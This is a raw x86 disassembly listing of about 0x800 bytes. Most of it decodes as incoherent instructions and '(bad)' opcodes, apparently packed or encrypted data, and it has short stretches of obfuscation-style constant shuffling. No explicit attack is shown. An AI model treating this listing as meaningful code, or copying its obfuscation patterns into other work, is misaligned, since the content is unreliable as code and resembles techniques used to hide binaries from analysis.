  40982b:	adc    dl,BYTE PTR [eax-0x1e]
  40982e:	repz out 0x21,al
  409831:	jbe    0x40984c
  409833:	sbb    eax,0x26a994bb
  409838:	and    eax,0x8c9678d2
  40983d:	sub    DWORD PTR [edx+0x479694b0],esp
  409843:	push   ecx
  409844:	mov    ebx,0x97f50f29
  409849:	fs scas eax,DWORD PTR es:[edi]
  40984b:	cs jl  0x4097ed
  40984e:	mov    al,0x9a
  409850:	fwait
  409851:	push   0xb8e301e2
  409856:	mov    dl,0xe3
  409858:	pop    esi
  409859:	jge    0x4098b3
  40985b:	aad    0xe5
  40985d:	adc    eax,0x44deb472
  409862:	xchg   ecx,eax
  409863:	jl     0x409856
  409865:	xchg   esi,eax
  409866:	jne    0x409857
  409868:	inc    esp
  409869:	cmp    al,0xcf
  40986b:	cmp    al,0xf6
  40986d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40986e:	sub    eax,0x4f9c0f3a
  409873:	mov    dh,0xc3
  409875:	jb     0x40987c
  409877:	(bad)  
  409878:	xor    edx,eax
  40987a:	popa   
  40987b:	mul    ch
  40987d:	push   0x1c
  40987f:	jmp    0x68792501
  409884:	mov    dl,0x12
  409886:	and    al,0x1a
  409888:	jg     0x40987b
  40988a:	and    BYTE PTR [ebx],bl
  40988c:	nop
  40988d:	adc    eax,0xbf0fb5ea
  409892:	clc    
  409893:	mov    ds:0x8adef7f9,al
  409898:	pop    ecx
  409899:	lea    ecx,[edx]
  40989b:	in     al,0x50
  40989d:	sub    BYTE PTR [esi+ebx*2+0x1f],ch
  4098a1:	retf   0x3f0f
  4098a4:	ds clc 
  4098a6:	and    eax,0x136f376f
  4098ab:	cpuid  
  4098ad:	mov    ebx,0x73fba24
  4098b2:	out    dx,al
  4098b3:	xor    DWORD PTR [ebx],ecx
  4098b5:	das    
  4098b6:	jl     0x40986c
  4098b8:	xchg   esp,eax
  4098b9:	pop    edi
  4098ba:	jg     0x4098e3
  4098bc:	ins    BYTE PTR es:[edi],dx
  4098bd:	aam    0x49
  4098bf:	push   esp
  4098c0:	or     ch,ah
  4098c2:	sahf   
  4098c3:	xor    bh,bl
  4098c5:	repz xor DWORD PTR [eax],eax
  4098c8:	add    DWORD PTR [edx-0x4f],0xffffff9d
  4098cc:	aaa    
  4098cd:	xchg   edi,eax
  4098ce:	mov    edi,0xd0dd671e
  4098d3:	mov    eax,ds:0x1e1e65e4
  4098d8:	cmp    al,0xff
  4098da:	(bad)  
  4098db:	jmp    0x388455b2
  4098e0:	mov    edx,0x6d596f2f
  4098e5:	aam    0xd7
  4098e7:	out    dx,al
  4098e8:	and    BYTE PTR [ecx],0xa4
  4098eb:	idiv   BYTE PTR [esi-0x7ae9e335]
  4098f1:	out    dx,eax
  4098f2:	cmp    DWORD PTR [edx+esi*8-0x19],ebp
  4098f6:	popf   
  4098f7:	mov    edx,0x912a8d95
  4098fc:	call   0xe766ce62
  409901:	adc    al,0xa5
  409903:	dec    ebx
  409905:	fild   DWORD PTR [eax+edi*2-0x32d11d2]
  40990d:	sar    ebx,0x84
  409910:	rcl    BYTE PTR [edx+ecx*4+0x7be6e2c6],0x50
  409918:	push   esi
  409919:	xchg   edi,eax
  40991a:	cmc    
  40991b:	xor    DWORD PTR [ebx+0x5211e344],esp
  409921:	inc    edi
  409922:	out    dx,al
  409923:	push   ebx
  409925:	mov    esp,esp
  409927:	imul   esp,DWORD PTR [eax-0x76],0x74
  40992b:	adc    BYTE PTR [ebx-0x4e],bh
  40992e:	popa   
  40992f:	test   al,0x47
  409931:	dec    ecx
  409932:	mov    bl,0xb6
  409934:	fdiv   QWORD PTR [edx]
  409936:	dec    edi
  409937:	jg     0x40995c
  409939:	mov    eax,0xf5cb98b2
  40993e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40993f:	jl     0x409906
  409941:	mov    ah,dh
  409943:	dec    ebp
  409944:	les    ecx,FWORD PTR [ebp-0x9]
  409947:	cwde   
  409948:	sub    dh,BYTE PTR [ebp+0x53294288]
  40994e:	dec    eax
  40994f:	mov    al,0xc3
  409951:	scas   eax,DWORD PTR es:[edi]
  409952:	int    0x36
  409954:	dec    edx
  409955:	dec    eax
  409956:	mov    esi,0xaed95c08
  40995b:	fadd   st(1),st
  40995d:	mov    ecx,0x2c4486bd
  409962:	inc    esp
  409963:	mov    bl,0x4c
  409965:	push   cs
  409966:	clc    
  409967:	lahf   
  409968:	jmp    0x40998a
  40996a:	xor    ecx,esp
  40996c:	sbb    dl,BYTE PTR [esp+edx*8-0x51]
  409970:	lods   al,BYTE PTR ds:[esi]
  409971:	fwait
  409972:	repnz pop esi
  409974:	aaa    
  409975:	jmp    0x4694fc84
  40997a:	cmp    BYTE PTR [ebx-0x21],dl
  40997d:	sub    DWORD PTR [edi+0x15],eax
  409980:	adc    cl,cl
  409982:	jmp    DWORD PTR [edx+0x31f0f371]
  409988:	jb     0x409a00
  40998a:	int3   
  40998b:	jge    0x4099a5
  40998d:	mov    ds:0x956404d4,eax
  409992:	xchg   bh,dh
  409994:	in     al,dx
  409995:	lea    ebp,[edx+eiz*4]
  409998:	add    eax,0xd2fb4b37
  40999d:	mov    edx,0x3c69cc70
  4099a2:	pop    ecx
  4099a3:	fsub   QWORD PTR [ebx]
  4099a5:	mov    al,ds:0xb6061187
  4099aa:	or     al,0xfc
  4099ac:	and    DWORD PTR [ecx],eax
  4099ae:	popa   
  4099af:	(bad)  
  4099b0:	mov    dh,0x6b
  4099b2:	sub    al,0x3
  4099b4:	pop    ebx
  4099b5:	popf   
  4099b6:	push   eax
  4099b7:	outs   dx,BYTE PTR ds:[esi]
  4099b8:	stos   DWORD PTR es:[edi],eax
  4099b9:	sbb    BYTE PTR [edi-0x3b],dh
  4099bc:	or     ch,BYTE PTR [eax]
  4099be:	sti    
  4099bf:	cs iret 
  4099c1:	inc    esp
  4099c2:	dec    edi
  4099c3:	pop    eax
  4099c4:	mov    edx,DWORD PTR [ecx-0x77]
  4099c7:	adc    eax,0x42a875
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x2bec14cf]
  409a19:	and    eax,0xf7b654ee
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a9f
  409a25:	cs pop edi
  409a27:	jae    0x409a18
  409a29:	shr    al,1
  409a2b:	jge    0x409a64
  409a2d:	xchg   edi,eax
  409a2e:	cld    
  409a2f:	pop    ss
  409a30:	std    
  409a31:	add    al,BYTE PTR [ecx-0x865e38]
  409a37:	or     esp,DWORD PTR [edx]
  409a39:	push   edx
  409a3a:	idiv   BYTE PTR [edi+0x17]
  409a3d:	aam    0x38
  409a3f:	aad    0xb1
  409a41:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409a43:	mov    edx,0xd69140be
  409a48:	xor    al,0xf3
  409a4b:	mov    ah,0xae
  409a4d:	sub    DWORD PTR [ecx+edi*1],eax
  409a50:	outs   dx,DWORD PTR ds:[esi]
  409a51:	rcr    DWORD PTR ds:0xca98bd99,1
  409a57:	aad    0x3f
  409a59:	sbb    eax,0x80a57296
  409a5e:	xor    eax,0x92699344
  409a63:	fcmovnb st,st(5)
  409a65:	and    ah,cl
  409a67:	adc    eax,0xd5135d61
  409a6c:	xor    eax,0x4e66dbd9
  409a71:	mov    ch,0x9
  409a73:	and    ah,BYTE PTR [ebx]
  409a75:	in     al,0x74
  409a77:	jmp    0x409ac2
  409a79:	add    ebx,ecx
  409a7b:	mov    al,ds:0xa909ab07
  409a80:	into   
  409a81:	xchg   ebp,eax
  409a82:	mov    esp,ds
  409a84:	cmp    ecx,DWORD PTR [edx+esi*8-0x14a1163d]
  409a8b:	mov    al,ds:0x573577e1
  409a90:	sub    ecx,DWORD PTR fs:[edi+0x3cbb287a]
  409a97:	test   ch,ah
  409a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a9a:	popf   
  409a9b:	repnz mov ecx,0x7ef4bcf5
  409aa1:	rcr    DWORD PTR [esi*8-0x647544c9],0xee
  409aa9:	popa   
  409aaa:	ror    BYTE PTR [edi+0x60],1
  409aad:	inc    esi
  409aae:	stos   DWORD PTR es:[edi],eax
  409aaf:	aam    0x5c
  409ab1:	jne    0x409a71
  409ab3:	sbb    BYTE PTR [edx+ebx*1-0x4b],bl
  409ab7:	out    dx,eax
  409ab8:	or     al,0x74
  409aba:	push   eax
  409abb:	mov    edx,0x63c3f57
  409ac0:	dec    edi
  409ac1:	pop    ds
  409ac2:	mov    edx,0xfbdeff1a
  409ac7:	stc    
  409ac8:	xchg   esi,eax
  409ac9:	fisubr WORD PTR [edx]
  409acb:	adc    BYTE PTR [ebx-0x75],dl
  409ace:	(bad)  
  409acf:	repz lock mov ch,0xc9
  409ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad4:	dec    esi
  409ad5:	xchg   edx,eax
  409ad6:	push   es
  409ad7:	mov    ah,0x21
  409ad9:	inc    eax
  409ada:	fidiv  WORD PTR [ebp-0x4409668c]
  409ae0:	push   ds
  409ae1:	mov    ah,0x6c
  409ae3:	pushf  
  409ae4:	xchg   ebx,eax
  409ae5:	sub    eax,0x63d16b3a
  409aea:	pop    eax
  409aeb:	test   eax,0xb81bc696
  409af0:	icebp  
  409af1:	jo     0x409abe
  409af3:	pop    ds
  409af4:	push   ecx
  409af5:	aas    
  409af6:	fnstcw WORD PTR [ebx]
  409af8:	dec    edx
  409af9:	or     DWORD PTR [eax+0x4],edx
  409afc:	mov    ss,edi
  409afe:	jl     0x409b2b
  409b00:	xchg   edx,eax
  409b01:	jmp    0x4441773
  409b06:	mov    BYTE PTR [ebx+0x3b],cl
  409b09:	out    dx,al
  409b0a:	shl    eax,0x7a
  409b0d:	sahf   
  409b0e:	(bad)  
  409b0f:	lea    ebx,[ecx-0x7a]
  409b12:	mov    bl,0xb1
  409b14:	in     al,0xbc
  409b16:	mov    dh,0x13
  409b18:	fimul  DWORD PTR [esi+0x44875261]
  409b1e:	sub    eax,0x5660db6
  409b23:	(bad)  
  409b24:	sub    ecx,DWORD PTR [edi+eax*2-0x6d]
  409b28:	outs   dx,DWORD PTR ds:[esi]
  409b29:	dec    esi
  409b2a:	fiadd  WORD PTR [ebx+0x7f35edb7]
  409b30:	jno    0x409b7c
  409b32:	add    cl,BYTE PTR [ebp-0x6bc6d8ca]
  409b38:	leave  
  409b39:	fidivr DWORD PTR [edx+0x60]
  409b3c:	adc    edi,DWORD PTR [ebp-0xd8924b1]
  409b42:	(bad)  [esi+0x3f]
  409b45:	push   ds
  409b46:	loope  0x409adb
  409b48:	xor    edi,eax
  409b4a:	dec    ebx
  409b4b:	mov    eax,DWORD PTR [ecx]
  409b4d:	call   0x894ba4d7
  409b52:	jge    0x409b24
  409b54:	imul   edx,DWORD PTR [edi+0x64],0x6f
  409b58:	jb     0x409b76
  409b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5b:	sbb    BYTE PTR [edx],0xa1
  409b5e:	mov    al,ds:0xdd4689ac
  409b63:	jg     0x409bdb
  409b65:	push   edi
  409b66:	dec    ecx
  409b67:	xchg   esp,eax
  409b68:	and    DWORD PTR [edi+edx*4-0x26],0x9aae8290
  409b70:	dec    esp
  409b71:	ins    DWORD PTR es:[edi],dx
  409b72:	daa    
  409b73:	repz cmp DWORD PTR [ebp+0x72],eax
  409b77:	in     al,dx
  409b78:	fmul   DWORD PTR [esi+0x23baf779]
  409b7e:	ss mov edx,0x9b2d2ba7
  409b84:	push   0x67045f9c
  409b89:	rol    DWORD PTR [esi+0x43],cl
  409b8c:	rcl    BYTE PTR [ecx+0x62fbc27a],cl
  409b92:	add    edx,ecx
  409b94:	data16 std 
  409b96:	cmp    BYTE PTR [edi+eiz*8-0x14],ah
  409b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b9b:	pusha  
  409b9c:	jne    0x409bad
  409b9e:	mov    al,0xd5
  409ba0:	(bad)  
  409ba1:	sbb    ah,BYTE PTR [edx-0x50015d81]
  409ba7:	int    0x11
  409ba9:	dec    esp
  409baa:	aaa    
  409bab:	sbb    bl,BYTE PTR [ebp+0x12]
  409bae:	in     eax,dx
  409baf:	jecxz  0x409b61
  409bb1:	inc    ebp
  409bb2:	or     bh,dl
  409bb4:	mov    bl,0xfa
  409bb6:	jo     0x409bbe
  409bb8:	les    ebx,FWORD PTR [ecx+0x1]
  409bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bbc:	out    0xeb,eax
  409bbe:	daa    
  409bbf:	adc    eax,0xf3fa0e38
  409bc4:	std    
  409bc5:	mov    eax,0x62290b2c
  409bca:	pop    edi
  409bcb:	inc    ebx
  409bcc:	in     al,dx
  409bcd:	adc    BYTE PTR [ebp+0x74bc81fe],0x96
  409bd4:	add    eax,0x3f82bf11
  409bd9:	pop    es
  409bda:	enter  0xa390,0x87
  409bde:	cmp    BYTE PTR [eax-0x10668246],ah
  409be4:	push   cs
  409be5:	sbb    bh,BYTE PTR [edi-0x18dbf210]
  409beb:	push   ebx
  409bec:	out    0xcd,al
  409bee:	sub    ah,BYTE PTR [edi]
  409bf0:	mov    ?,WORD PTR [eax+0x33c1c8fb]
  409bf6:	xchg   ebp,eax
  409bf7:	dec    ebx
  409bf8:	lods   al,BYTE PTR ds:[esi]
  409bf9:	push   0x1c87f287
  409bfe:	xchg   edi,eax
  409bff:	inc    ecx
  409c00:	fs jae 0x409bdf
  409c03:	cwde   
  409c04:	addr16 dec ebx
  409c06:	mov    dh,0x59
  409c08:	lahf   
  409c09:	add    BYTE PTR [esi+0x50f62de],cl
  409c0f:	inc    DWORD PTR [eax]
  409c11:	test   eax,0xf0c99912
  409c16:	xlat   BYTE PTR ds:[ebx]
  409c17:	cmp    DWORD PTR [ebp-0xcc340b2],esp
  409c1d:	packssdw mm2,QWORD PTR [esi+0x6fcf7499]
  409c24:	out    0xef,eax
  409c26:	mov    bl,0x45
  409c28:	dec    esp
  409c29:	inc    ecx
  409c2a:	sbb    ecx,ebp
  409c2c:	ss adc al,0x41
  409c2f:	jno    0x409bdc
  409c31:	sub    al,0x61
  409c33:	or     al,BYTE PTR [edx-0x38]
  409c36:	imul   ebp,eax,0x5094bc92
  409c3c:	jg     0x409bcb
  409c3e:	ret    0x9b9b
  409c41:	(bad)  
  409c42:	jns    0x409c5f
  409c44:	fistp  DWORD PTR [edi-0x39]
  409c47:	add    DWORD PTR [eax-0x6146ccdc],esp
  409c4d:	scas   eax,DWORD PTR es:[edi]
  409c4e:	sbb    DWORD PTR [edx+0x4a],esi
  409c51:	push   ebx
  409c52:	sbb    al,0x3f
  409c54:	pop    edx
  409c55:	mov    cl,0x5b
  409c57:	inc    esp
  409c58:	cmp    ebp,esi
  409c5a:	stos   DWORD PTR es:[edi],eax
  409c5b:	fist   DWORD PTR [ecx]
  409c5d:	(bad)
  409c62:	addr16 push ebp
  409c64:	xor    bl,BYTE PTR [eax+0x2617f9da]
  409c6a:	adc    ah,BYTE PTR [ebp+0x73]
  409c6d:	loopne 0x409c4d
  409c6f:	test   DWORD PTR [esi-0x78],esi
  409c72:	scas   eax,DWORD PTR es:[edi]
  409c73:	cmp    BYTE PTR [ecx+0x1c],al
  409c76:	je     0x409c44
  409c78:	arpl   WORD PTR [edi+edx*2-0x2f],ax
  409c7c:	xor    al,BYTE PTR [ecx]
  409c7e:	call   0xa968:0x26cc71fb
  409c85:	ret    
  409c86:	out    0xb3,al
  409c88:	xchg   ebp,eax
  409c89:	ror    BYTE PTR [edx-0x5cbe5780],1
  409c8f:	test   BYTE PTR [esi-0x77658044],ah
  409c95:	fist   WORD PTR [ebp-0x3f]
  409c98:	inc    ecx
  409c99:	push   edx
  409c9a:	pushf  
  409c9b:	mov    bh,dl
  409c9d:	pop    ecx
  409c9e:	inc    esi
  409c9f:	retf   0xc616
  409ca2:	mov    edx,0x87488912
  409ca7:	repz mov bl,0x37
  409caa:	cmp    eax,DWORD PTR [ebp+0x799d5e38]
  409cb0:	enter  0xca8e,0xfe
  409cb4:	adc    DWORD PTR [esi],0x352f464a
  409cba:	mov    ds:0x824e81,eax
  409cbf:	cwde   
  409cc0:	(bad)  
  409cc1:	sbb    al,0x3d
  409cc3:	fucom  st(7)
  409cc5:	jnp    0x409d2d
  409cc7:	push   esp
  409cc8:	lods   al,BYTE PTR ds:[esi]
  409cc9:	cld    
  409cca:	sub    BYTE PTR [ebp+0x35],dl
  409ccd:	daa    
  409cce:	pop    esp
  409ccf:	aaa    
  409cd0:	daa    
  409cd1:	xchg   esi,eax
  409cd2:	mul    DWORD PTR [edx]
  409cd4:	mov    edx,0x87535112
  409cd9:	cmc    
  409cda:	xlat   BYTE PTR ds:[ebx]
  409cdb:	jle    0x409c7d
  409cdd:	rcr    DWORD PTR ds:0x27988a53,cl
  409ce3:	mov    dl,0x38
  409ce5:	or     DWORD PTR [ebp+0x72],ecx
  409ce8:	pop    ebp
  409ce9:	push   edx
  409cea:	push   eax
  409ceb:	add    dl,ch
  409ced:	push   0x77
  409cef:	cmp    eax,0xe732b81f
  409cf4:	outs   dx,BYTE PTR ds:[esi]
  409cf5:	aaa    
  409cf6:	mov    ch,0xd
  409cf8:	pop    edx
  409cf9:	xchg   ebx,eax
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x1b31726f],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d73
  409d66:	xor    ah,bl
  409d68:	in     al,0xdb
  409d6a:	jnp    0x409cf6
  409d6c:	js     0x409dc9
  409d6e:	add    BYTE PTR [edi],dl
  409d70:	fidiv  WORD PTR [edx]
  409d72:	(bad)  
  409d73:	(bad)  
  409d74:	cs mov dh,0x5
  409d77:	mov    bl,0xf
  409d79:	adc    eax,0x8f70531
  409d7e:	or     BYTE PTR [esi],ch
  409d80:	div    DWORD PTR [edx+ecx*8]
  409d83:	xor    eax,0xdee8058a
  409d88:	sbb    BYTE PTR [edi],ch
  409d8a:	lods   al,BYTE PTR ds:[esi]
  409d8b:	and    BYTE PTR [ebx],cl
  409d8d:	idiv   BYTE PTR [ebx]
  409d8f:	popa   
  409d90:	push   ecx
  409d91:	inc    esp
  409d92:	pushf  
  409d93:	icebp  
  409d94:	out    0xe1,eax
  409d96:	inc    edi
  409d97:	jb     0x409de1
  409d99:	lods   al,BYTE PTR ds:[esi]
  409d9a:	sub    ecx,DWORD PTR [edx]
  409d9c:	lock inc esp
  409d9e:	aas    
  409d9f:	add    eax,0x374e62c0
  409da4:	pop    edi
  409da5:	add    DWORD PTR [ebx-0x24df80c5],ebp
  409dab:	cmp    eax,0xcb3dde7f
  409db0:	test   al,0xec
  409db2:	sub    dl,bl
  409db4:	clc    
  409db5:	cwde   
  409db6:	pushf  
  409db7:	out    dx,eax
  409db8:	fld    QWORD PTR [esp+edx*2-0x55]
  409dbc:	lods   eax,DWORD PTR ds:[esi]
  409dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbe:	inc    edi
  409dbf:	xchg   DWORD PTR [edx],ecx
  409dc1:	out    0x7,eax
  409dc3:	jg     0x409d45
  409dc5:	push   cs
  409dc6:	sbb    dh,BYTE PTR [ebx]
  409dc8:	xor    ecx,DWORD PTR [esi-0x578c0a33]
  409dce:	sbb    DWORD PTR [edx],esi
  409dd0:	(bad)  
  409dd1:	xor    BYTE PTR [eax+ecx*2-0xc327e80],dl
  409dd8:	imul   eax,DWORD PTR [esi-0x389a14a7],0x4c
  409ddf:	mov    al,ds:0x8b3b8eba
  409de4:	(bad)  
  409de5:	mov    esi,0x6dfc6d6c
  409dea:	nop
  409deb:	rcl    DWORD PTR [esi+0x4de4001f],1
  409df1:	push   ss
  409df2:	imul   ecx,eax,0x1f
  409df5:	jae    0x409db4
  409df7:	cmp    ebp,DWORD PTR [ebp-0xaea6396]
  409dfd:	push   0x19
  409dff:	ds push esi
  409e01:	ins    BYTE PTR es:[edi],dx
  409e02:	pop    es
  409e03:	push   cs
  409e04:	dec    edi
  409e05:	ins    DWORD PTR es:[edi],dx
  409e06:	loopne 0x409de6
  409e08:	and    DWORD PTR [ecx+edx*4-0x7e3acd46],eax
  409e0f:	jl     0x409e0d
  409e11:	test   BYTE PTR [eax],dh
  409e13:	mov    bh,0xff
  409e15:	ret    0xec31
  409e18:	imul   esi,DWORD PTR [eax+ecx*4+0x27],0xa9a12676
  409e20:	and    esi,DWORD PTR [edi]
  409e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e23:	aad    0xc9
  409e25:	imul   edi,DWORD PTR [ebp-0x6979bc27],0x194719d7
  409e2f:	sbb    BYTE PTR [ebp-0x1d],cl
  409e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e33:	cld    
  409e34:	mov    esp,0xd63467b2
  409e39:	mov    edi,0xbe96fed
  409e3e:	fisubr WORD PTR [esi]
  409e40:	out    dx,al
  409e41:	icebp  
  409e42:	xor    DWORD PTR [ecx-0x5a94b96a],ebp
  409e48:	mov    esi,0xb0f2e392
  409e4d:	mov    ebx,0x76e4e49e
  409e52:	or     bh,cl
  409e54:	cld    
  409e55:	add    al,0xe1
  409e57:	call   0xf5b386e3
  409e5c:	add    edi,DWORD PTR [esi+edx*4]
  409e5f:	pop    ss
  409e60:	(bad)  
  409e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e62:	call   0xc4cd0607
  409e67:	test   DWORD PTR [esp+eax*2-0x4c662e9b],edi
  409e6e:	inc    edx
  409e6f:	mov    cl,dh
  409e71:	mov    eax,ds:0x81900b8f
  409e76:	fist   DWORD PTR [ebp+eax*8-0x282d9379]
  409e7d:	push   ds
  409e7e:	arpl   WORD PTR [ebx],bp
  409e80:	mov    cs,esp
  409e82:	or     eax,0x85b3e3f
  409e87:	xlat   BYTE PTR ds:[ebx]
  409e88:	daa    
  409e89:	sbb    al,0xe4
  409e8b:	retf   
  409e8c:	pcmpgtb mm3,QWORD PTR [eax]
  409e8f:	xchg   esp,eax
  409e90:	(bad)  
  409e91:	imul   ebp,DWORD PTR [esi+ebx*1+0x33],0x66c1722
  409e99:	ss adc ax,0xcb2c
  409e9e:	ja     0x409f08
  409ea0:	sub    BYTE PTR [esp+eiz*8+0x18],0xdb
  409ea5:	and    edx,0x555ec4cf
  409eab:	sbb    ah,ah
  409ead:	push   esp
  409eae:	jae    0x409e68
  409eb0:	lds    eax,FWORD PTR [ecx+0x11]
  409eb3:	mov    ecx,0x2c1a894b
  409eb8:	mov    edx,0x3c4d1e66
  409ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ebe:	sub    ebp,DWORD PTR [edi+0x4a]
  409ec1:	or     BYTE PTR [esi+edi*2],bl
  409ec4:	call   0xca6:0xa7382893
  409ecb:	jo     0x409ec2
  409ecd:	adc    esi,esp
  409ecf:	pop    ebx
  409ed0:	dec    BYTE PTR [ebp-0x60fa3e7e]
  409ed6:	or     ch,BYTE PTR [esi-0x325c56bc]
  409edc:	test   BYTE PTR [edx-0x67],bh
  409edf:	or     al,0x57
  409ee1:	fwait
  409ee2:	bound  ebp,QWORD PTR [esi]
  409ee4:	fwait
  409ee5:	adc    ecx,edi
  409ee7:	sbb    BYTE PTR [eax-0x22],al
  409eea:	push   edx
  409eeb:	jge    0x409e96
  409eed:	pop    esi
  409eee:	lds    ebp,FWORD PTR [edx+0x5accd036]
  409ef4:	arpl   WORD PTR [eax-0x6a413b8],dx
  409efa:	imul   DWORD PTR [ecx]
  409efc:	fnstenv [edi]
  409efe:	sbb    al,0x68
  409f00:	mov    ebp,0x1e8c5f7c
  409f05:	mov    al,0x6b
  409f07:	sub    DWORD PTR [eax+0x3],esi
  409f0a:	push   edx
  409f0b:	dec    esi
  409f0c:	xor    eax,0x43a55adc
  409f11:	je     0x409ed7
  409f13:	in     al,0x4b
  409f15:	mov    esi,0xc8186afd
  409f1a:	sbb    bh,BYTE PTR [edx-0x395e7d88]
  409f20:	mov    bh,0x64
  409f22:	mov    esp,0x92c986dc
  409f27:	mov    ecx,0xb52970aa
  409f2c:	mov    ch,0x82
  409f2e:	cmc    
  409f2f:	lock jle 0x409f5a
  409f32:	mov    ecx,0x416b0c08
  409f37:	std    
  409f38:	xor    eax,ecx
  409f3a:	pop    ebp
  409f3b:	fistp  WORD PTR [eax]
  409f3d:	jge    0x409f39
  409f3f:	or     DWORD PTR [edi],edx
  409f41:	xchg   edi,eax
  409f42:	icebp  
  409f43:	or     al,0xfe
  409f45:	push   es
  409f46:	jae    0x409ef8
  409f48:	nop
  409f49:	in     al,dx
  409f4a:	mov    ds:0xd36f040d,eax
  409f4f:	sbb    BYTE PTR [ecx+0x3d],dh
  409f52:	inc    eax
  409f53:	xchg   esi,eax
  409f54:	std    
  409f55:	ret    0xa88e
  409f58:	test   al,0x8d
  409f5a:	jno    0x409f92
  409f5c:	jns    0x409f1c
  409f5e:	and    ebx,DWORD PTR [edx+0x47]
  409f61:	out    dx,al
  409f62:	aaa    
  409f63:	ds pop ecx
  409f65:	icebp  
  409f66:	jne    0x409fb2
  409f68:	mov    esp,0xc183840d
  409f6d:	in     eax,0xde
  409f6f:	fldcw  WORD PTR ds:0x60ab57d0
  409f75:	enter  0x131,0xee
  409f79:	mov    dl,0xf2
  409f7b:	out    0x8c,eax
  409f7d:	push   0xffffff8f
  409f7f:	je     0x409f2c
  409f81:	cmp    BYTE PTR [ebp+0xe33a97],ch
  409f87:	bound  edx,QWORD PTR [edx-0x38]
  409f8a:	leave  
  409f8b:	xchg   esi,eax
  409f8c:	pop    ds
  409f8d:	es in  al,0xbf
  409f90:	xor    DWORD PTR [ebp-0x4919b009],esp
  409f96:	pop    edx
  409f97:	cmp    edx,edx
  409f99:	pop    esi
  409f9a:	stos   DWORD PTR es:[edi],eax
  409f9b:	std    
  409f9c:	in     eax,dx
  409f9d:	(bad)  
  409f9e:	(bad)  
  409f9f:	(bad)  
  409fa0:	arpl   WORD PTR [esi-0x75],dx
  409fa3:	sub    esp,edi
  409fa5:	in     eax,dx
  409fa6:	pusha  
  409fa7:	es popf 
  409fa9:	test   al,0x15
  409fab:	jge    0x409f80
  409fad:	and    BYTE PTR [edi],ch
  409faf:	pusha  
  409fb0:	xchg   edx,eax
  409fb1:	fist   WORD PTR [ecx+0x4]
  409fb4:	je     0x409f8b
  409fb6:	stos   DWORD PTR es:[edi],eax
  409fb7:	mov    dl,0x99
  409fb9:	in     eax,0xc1
  409fbb:	loopne 0x40a01c
  409fbd:	bound  ebx,QWORD PTR [ecx]
  409fbf:	loop   0x40a02f
  409fc1:	mov    esi,0x67055fd3
  409fc6:	nop
  409fc7:	push   esp
  409fc8:	es inc eax
  409fca:	retf   
  409fcb:	xchg   ecx,eax
  409fcc:	push   esi
  409fcd:	loopne 0x409fbe
  409fcf:	jp     0x40a04c
  409fd1:	popf   
  409fd2:	in     eax,dx
  409fd3:	and    dh,BYTE PTR [edi+edx*4+0x1e]
  409fd7:	cmp    al,BYTE PTR [ebp+ebp*4-0x361764b0]
  409fde:	push   es
  409fdf:	jecxz  0x409f68
  409fe1:	and    eax,0x2bd69017
  409fe6:	and    DWORD PTR [edi],edx
  409fe8:	sti    
  409fe9:	or     edi,DWORD PTR [ebx+0x4fd11b42]
  409fef:	sahf   
  409ff0:	mov    eax,ds:0xec070ac5
  409ff5:	lds    esp,FWORD PTR ds:0xb9b30654
  409ffb:	ja     0x409fd4
  409ffd:	pop    es
  409ffe:	test   BYTE PTR [esi-0x5754c88a],0x5d
  40a005:	shl    BYTE PTR [ebp-0x2708160],cl
  40a00b:	aas    
  40a00c:	(bad)  
  40a00d:	fistp  WORD PTR [esp+edx*4-0x62]
  40a011:	sbb    cl,dh
  40a013:	add    bl,BYTE PTR [edi+0x6fac2e53]
  40a019:	mov    eax,0xfb7ddfd5
  40a01e:	dec    ecx
  40a01f:	mov    ds:0xc9d1993e,al
  40a024:	mov    ch,0x40
  40a026:	hlt    
  40a027:	dec    edi
  40a028:	jp     0x40a066
